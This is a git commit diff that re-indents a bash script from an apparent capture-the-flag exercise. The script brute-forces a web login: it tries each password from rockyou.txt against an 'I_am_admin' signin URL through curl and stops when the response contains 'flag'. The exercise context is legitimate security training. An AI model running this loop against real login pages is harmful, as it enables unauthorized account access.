c86a3b5d4c096d6ee88e5a1850c7bd7aa3140ee8
GENEVEY Lucie <l.genevey@retraitespopulaires.ch>
2025-08-28 13:00:47 +0200

    fix: bash syntax

--- 09-Bruteforce/Ressources/script.sh
+++ 09-Bruteforce/Ressources/script.sh
@@ -7,15 +7,15 @@ password_file="rockyou.txt"
 while read password
 
 do
-	echo "Test du mot de passe : $password"
+    echo "Test du mot de passe : $password"
 
 	result=$(curl -s "http://$ip_address/index.php?page=signin&username=I_am_admin&password=$password&Login=Login")
 
-	if echo "$result" | grep -q "flag"; then
-		echo "Mot de passe trouvé : $password"
-		echo "$result"
-		exit 0
-	fi
+    if echo "$result" | grep -q "flag"; then
+        echo "Mot de passe trouvé : $password"
+        echo "$result"
+        exit 0
+    fi
 
 done < "$password_file"
 
